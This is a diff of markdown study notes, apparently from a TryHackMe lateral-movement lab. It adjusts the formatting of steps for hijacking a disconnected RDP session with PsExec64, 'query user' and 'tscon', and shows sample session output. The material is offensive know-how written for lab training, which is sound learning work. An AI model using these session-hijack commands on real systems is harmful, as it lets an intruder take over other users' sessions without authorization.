@@ -1273,9 +1273,9 @@ According to the command output above, if we were currently connected via RDP us
 
 3. Identify your own SESSIONNAME (e.g., rdp-tcp#6).
 4. Hijack a disconnected session using:
-    ```
-    tscon <ID> /dest:<SESSIONNAME>
-    ```
+```
+tscon <ID> /dest:<SESSIONNAME>
+```
 - **Windows Server 2019 blocks hijacking without the user’s password.**
 
 ### 5. Task Instructions
@@ -1283,20 +1283,20 @@ According to the command output above, if we were currently connected via RDP us
 - Get new credentials from the distributor link. (Must be from http://distributor.za.tryhackme.com/creds_t2)
 - RDP into THMJMP2 with those credentials.
 ```
-  xfreerdp /v:thmjmp2.za.tryhackme.com /u:YOUR_USER /p:YOUR_PASSWORD
+xfreerdp /v:thmjmp2.za.tryhackme.com /u:YOUR_USER /p:YOUR_PASSWORD
 ```
 - Hijack any t1_toby.beck session marked Disc.
 ```
   cmd #(not powershell)
   PsExec64.exe -s cmd.exe
   query user
-  ```
+```
 looks like: 
 ```
   C:\> query user
-  USERNAME            SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
-  >kelly.blake         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
-  t1_toby.beck                            3  Disc            .  4/6/2022 6:51 AM
+  USERNAME           SESSIONNAME     ID  STATE   IDLE TIME  LOGON TIME
+  >kelly.blake       rdp-tcp#6       2  Active          .   4/1/2022 4:09 AM
+  t1_toby.beck                       3  Disc            .   4/6/2022 6:51 AM
   t1_toby.beck1 ...
 ```
 Next take toby.beck id and use session name of kelly to take hijack RDP session
